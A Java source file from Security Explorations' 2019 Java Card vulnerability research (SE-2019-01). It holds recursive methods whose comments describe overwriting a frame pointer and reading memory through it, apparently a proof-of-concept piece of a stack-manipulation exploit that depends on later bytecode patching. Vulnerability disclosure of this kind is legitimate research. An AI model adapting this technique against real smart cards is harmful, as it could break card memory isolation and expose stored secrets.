/*## (c) SECURITY EXPLORATIONS    2019 poland                                #*/
/*##     http://www.security-explorations.com                                #*/

/* RESEARCH MATERIAL:	SE-2019-01                                            */
/* Security vulnerabilities in Java Card                                      */

/* THIS SOFTWARE IS PROTECTED BY DOMESTIC AND INTERNATIONAL COPYRIGHT LAWS    */
/* UNAUTHORISED COPYING OF THIS SOFTWARE IN EITHER SOURCE OR BINARY FORM IS   */
/* EXPRESSLY FORBIDDEN. ANY USE, INCLUDING THE REPRODUCTION, MODIFICATION,    */
/* DISTRIBUTION, TRANSMISSION, RE-PUBLICATION, STORAGE OR DISPLAY OF ANY      */
/* PART OF THE SOFTWARE, FOR COMMERCIAL OR ANY OTHER PURPOSES REQUIRES A      */
/* VALID LICENSE FROM THE COPYRIGHT HOLDER.                                   */

/* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS    */
/* OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,*/
/* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL    */
/* SECURITY EXPLORATIONS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, */
/* WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF  */
/* OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE     */
/* SOFTWARE.                                                                  */

package com.se.vulns;

public class Test {
 public static short val;

 public static void store_val(short v) {
   val=v;
 }

 public static void read_stack_s(int cnt,short FP) {
  if (cnt>0) {
   if (cnt==1) {
    read_stack_s(cnt-1,FP);
    //read mem through overwritten FP
    short res=0x1122;
    res=0x1122;
    res=0x1122;
    res=0x1122;
    res=0x1122;
    res=0x1122;
    res=0x1122;
    res=0x1122;
    //store val read through overwritten FP
    store_val(FP);
    return;
   } else {
    read_stack_s(cnt-1,FP);
    return;
   }
  } else {
   //cnt==0
   //overwrite FP
   short res=0x3344;
   res=0x3344;
   res=0x3344;
   res=0x3344;
   res=0x3344;
   res=0x3344;
   res=0x3344;
   res=0x3344;
   return;
  }
 }

 public static void read_stack_a(int cnt,short FP) {
  if (cnt>0) {
   if (cnt==1) {
    read_stack_s(cnt-1,FP);
    //read mem through overwritten FP
    short res=0x1122;
    res=0x1122;
    res=0x1122;
    res=0x1122;
    res=0x1122;
    res=0x1122;
    res=0x1122;
    res=0x1122;
    //store val read through overwritten FP
    store_val(FP);
    return;
   } else {
    read_stack_s(cnt-1,FP);
    return;
   }
  } else {
   //cnt==0
   //overwrite FP
   short res=0x3344;
   res=0x3344;
   res=0x3344;
   res=0x3344;
   res=0x3344;
   res=0x3344;
   res=0x3344;
   res=0x3344;
   return;
  }
 }
}
